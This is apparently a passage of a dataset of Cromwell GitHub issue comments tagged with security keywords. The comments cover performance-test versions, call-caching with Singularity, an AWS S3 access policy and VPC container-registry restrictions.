""$oute4a6eeab"" ""$erre4a6eeab""' EXIT; tee '/cromwell_root/stdout' < ""$oute4a6eeab"" &; tee '/cromwell_root/stderr' < ""$erre4a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435847865:1937,access,access,1937,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435847865,2,"['access', 'authenticat']","['access', 'authentication']"
Security,"> 1. It looks like the perf tests were run on version `""cromwellVersion"": ""48-e0cee74-SNAP"",`, but I don't see that hash in the commit history here.; > ; > I just want to check that was the version you were expecting them to run against, since I would expect it to be a `49-...` hash (you presumably had to rebase onto develop to undo all of the not-quite-summarizer-fix changes)?. @cjllanwarne this is the proper version. I actually took your initial `cjl_summarization_queue` branch and made updates in it. Then I built it locally and pushed to my personal Dockerhub.; I only merged develop branch into this one before creating the PR. >I think we could make this process more efficient by only writing the IDs into the summary queue in the first place if we know we'll actually want to summarize them later on. Do you mean write only those IDs which have certain metadata key value? I'm not sure if this would give us some additional performance boost, since we'll need to check each record for matching our criteria.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584879436:116,hash,hash,116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584879436,4,['hash'],['hash']
Security,"> > I have the same problem. Have you solved it?; > ; > I think it might be a bogus warning? My container seems to run correctly. Since I was using a Singularity image file, I couldn't get a Docker-hash, which resulted in call-cache not working. This is the key issue. Isn't the main reason we use server mode for call-cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1047342504:198,hash,hash,198,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1047342504,1,['hash'],['hash']
Security,"> Alternatively, maybe the AWS Batch role doesn't have read access to the S3 bucket? The Cromwell server and the Batch instances are different. Here's the IAM S3 Policy for the Genomics Batch EC2 role `GenomicsEnv-Batch-IamStac-GenomicsEnvBatchInstance-16INP51KVS4TZ`. ```; {; ""Version"": ""2012-10-17"",; ""Statement"": [; {; ""Action"": [; ""s3:*""; ],; ""Resource"": [; ""arn:aws:s3:::concr-genomics-results"",; ""arn:aws:s3:::concr-genomics-results/*""; ],; ""Effect"": ""Allow"",; ""Sid"": ""S3BucketAllowAllObjectOps""; }; ]; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435018864:60,access,access,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435018864,1,['access'],['access']
Security,"> Another option would be to set your VPC configuration to allow access to GCR from inside it. That might be useful in any case since the workflows you run might want to import tools based in external GCR locations.; > ; > I suspect you might need to allow your VPC to access other google services as well anyway - to allow it to access PAPI for example?. Thats not usable option for us. That would allow unaudited containers in our system and we cannot allow that. ; We have own container registry inside vpc and add required containers there after audit. vpc service control (https://cloud.google.com/vpc-service-controls) allows us select witch google services are usable and which are not. Basically this hardcoded container is only problem with our excisting environment. And because of that, we need to build own custom version of Cromwell (and update it), instead of just changing it in config. And it seems that we aren't only ones with same problem (based by comment in jira ticket).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5586#issuecomment-662704167:65,access,access,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5586#issuecomment-662704167,8,"['access', 'audit']","['access', 'audit']"
